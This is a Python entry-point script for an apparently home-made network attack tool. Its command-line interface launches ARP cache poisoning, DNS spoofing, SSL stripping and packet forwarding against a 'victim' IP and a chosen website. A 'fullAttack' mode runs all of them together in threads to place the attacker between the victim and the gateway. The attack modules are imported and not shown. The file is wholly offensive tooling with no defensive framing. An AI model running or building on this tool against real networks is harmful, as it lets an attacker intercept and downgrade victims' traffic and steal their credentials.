
import argparse
import sys
from utils import is_root, list_active_interfaces, get_first_active_interface, get_mac_address_of_interface, get_ip_address_of_interface, get_mac_address_from_ip
from arpPoisoning import ARPSpoofer
from dnsSpoofing import DNSSpoofer
from sslStripping import SSLStripper
from forwarder import Forwarder
import threading

def main():
    if not is_root():
        sys.exit("This script requires root privileges. Please run as root.")

    # -- Setup CLI parser --
    parser = argparse.ArgumentParser(description="A tool for poisoning/spoofing ARP and DNS with SSL stripping capabilities.")
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # -- General arguments --
    parser.add_argument('--interface', type=str, help='The network interface to use, default is the first active interface')
    parser.add_argument('--macAttacker', type=str, help='The MAC address of the attacker, default is the MAC address of the interface')
    parser.add_argument('--ipAttacker', type=str, help='The IP address of the attacker, default is the IP address of the interface')
                        
    # -- Attack specific commands & arguments --
    
    # List network interfaces
    list_interface_parser = subparsers.add_parser('listInterfaces', help='List all active network interfaces')

    # ARP Poison
    arp_parser = subparsers.add_parser('arpPoison', help='Poison the ARP cache of a target')
    arp_parser.add_argument('--ipVictim', type=str, help='The IP address of the victim')
    arp_parser.add_argument('--macVictim', type=str, help='The MAC address of the victim')
    arp_parser.add_argument('--ipToSpoof', type=str, help='The IP address to spoof')

    # DNS Spoof
    dns_parser = subparsers.add_parser('dnsSpoof', help='Spoof DNS responses')
    dns_parser.add_argument('--ipVictim', type=str, help='The IP address of the victim')
    dns_parser.add_argument('--siteToSpoof', type=str, help='The website to spoof')

    # SSL Strip
    ssl_parser = subparsers.add_parser('sslStrip', help='Strip SSL from HTTP traffic')
    ssl_parser.add_argument('--ipVictim', type=str, help='The IP address of the victim')
    ssl_parser.add_argument('--siteToSpoof', type=str, help='The website to spoof')

    # Forward packages
    forward_parser = subparsers.add_parser('forward', help='Forward packages between two hosts')
    forward_parser.add_argument('--ipVictim', type=str, help='The IP address of the victim')
    forward_parser.add_argument('--siteToSpoof', type=str, help='The website to spoof')

    # Full attack
    full_attack_parser = subparsers.add_parser('fullAttack', help='Perform a full attack')
    full_attack_parser.add_argument('--ipVictim', type=str, help='The IP address of the victim')
    full_attack_parser.add_argument('--macVictim', type=str, help='The MAC address of the victim')
    full_attack_parser.add_argument('--ipGateway', type=str, help='The IP address of the gateway')
    full_attack_parser.add_argument('--siteToSpoof', type=str, help='The website to spoof')


    # -- Parse arguments --
    args = parser.parse_args()

    # Populate the default values
    if args.interface is None:
        args.interface = get_first_active_interface().name
    if args.macAttacker is None:
        args.macAttacker = get_mac_address_of_interface(args.interface)
    if args.ipAttacker is None:
        args.ipAttacker = get_ip_address_of_interface(args.interface)

    # -- Execute the command --
    if args.command == 'arpPoison':
        if args.macVictim is None and args.ipVictim is not None:
            args.macVictim = get_mac_address_from_ip(args.ipVictim, args.interface)
        elif args.ipVictim is None or args.macVictim is None or args.ipToSpoof is None:
            sys.exit("Usage: python main.py arpPoison --ipVictim <ip> --macVictim <mac> --ipToSpoof <ip>")
        arp_spoofer = ARPSpoofer(args.interface, args.macAttacker, args.ipAttacker, args.macVictim, args.ipVictim, args.ipToSpoof)
        arp_spoofer.spoof()
    elif args.command == 'dnsSpoof':
        if args.ipVictim is None or args.siteToSpoof is None:
            sys.exit("Usage: python main.py dnsSpoof --ipVictim <ip> --siteToSpoof <url>")
        dns_spoofer = DNSSpoofer(args.interface, args.ipAttacker, args.ipVictim, args.siteToSpoof)  
        dns_spoofer.spoof()
    elif args.command == 'sslStrip':
        if args.ipVictim is None or args.siteToSpoof is None:
            sys.exit("Usage: python main.py sslStrip --ipVictim <ip> --siteToSpoof <url>")
        ssl_stripper = SSLStripper(args.interface, args.ipVictim, args.ipAttacker, args.siteToSpoof)
        ssl_stripper.strip()
    elif args.command == 'forward':
        if args.ipVictim is None or args.siteToSpoof is None:
            sys.exit("Usage: python main.py forward --ipVictim <ip> --siteToSpoof <url>")
        forwarder = Forwarder(args.interface, args.ipAttacker, args.ipVictim, args.siteToSpoof)
        forwarder.forward()
    elif args.command == 'fullAttack':
        if args.macVictim is None and args.ipVictim is not None:
            args.macVictim = get_mac_address_from_ip(args.ipVictim, args.interface)
        if args.ipVictim is None or args.ipGateway is None or args.siteToSpoof is None:
            sys.exit("Usage: python main.py fullAttack --ipVictim <ip> --macVictim <mac> --ipGateway <ip> --siteToSpoof <url>")
        arp_spoofer_victim = ARPSpoofer(args.interface, args.macAttacker, args.ipAttacker, args.macVictim, args.ipVictim, args.ipGateway)
        arp_spoofer_gateway = ARPSpoofer(args.interface, args.macAttacker, args.ipAttacker, args.macVictim, args.ipGateway, args.ipVictim)
        dns_spoofer = DNSSpoofer(args.interface, args.ipAttacker, args.ipVictim, args.siteToSpoof)
        ssl_stripper = SSLStripper(args.interface, args.ipVictim, args.ipAttacker, args.siteToSpoof)
        forwarder = Forwarder(args.interface, args.ipAttacker, args.ipVictim, args.siteToSpoof)
        arp_spoofer_victim_thread = threading.Thread(target=arp_spoofer_victim.spoof)
        arp_spoofer_gateway_thread = threading.Thread(target=arp_spoofer_gateway.spoof)
        dns_spoofer_thread = threading.Thread(target=dns_spoofer.spoof)
        ssl_stripper_thread = threading.Thread(target=ssl_stripper.strip)
        forwarder_thread = threading.Thread(target=forwarder.forward)
        arp_spoofer_victim_thread.start()
        arp_spoofer_gateway_thread.start()
        dns_spoofer_thread.start()
        ssl_stripper_thread.start()
        forwarder_thread.start()
        
        forwarder_thread.join()
        ssl_stripper_thread.join()
        dns_spoofer_thread.join()
        arp_spoofer_gateway_thread.join()
        arp_spoofer_victim_thread.join()

    elif args.command == 'listInterfaces':
        list_active_interfaces()

if __name__ == "__main__":
    main()
